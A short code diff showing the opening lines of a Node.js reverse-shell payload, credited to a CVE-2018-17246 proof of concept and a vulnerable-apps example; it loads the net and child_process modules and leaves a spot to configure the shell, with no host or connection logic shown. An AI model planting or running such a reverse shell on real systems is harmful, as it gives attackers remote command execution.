@@ -1,6 +1,6 @@
 // creds: https://github.com/mpgn/CVE-2018-17246/blob/3d866d5321b63185592d1abd01b5cdea550f6c76/README.md
 // https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
-on(){
+(function(){
     var net = require("net"),
         cp = require("child_process"),
         // config shell here
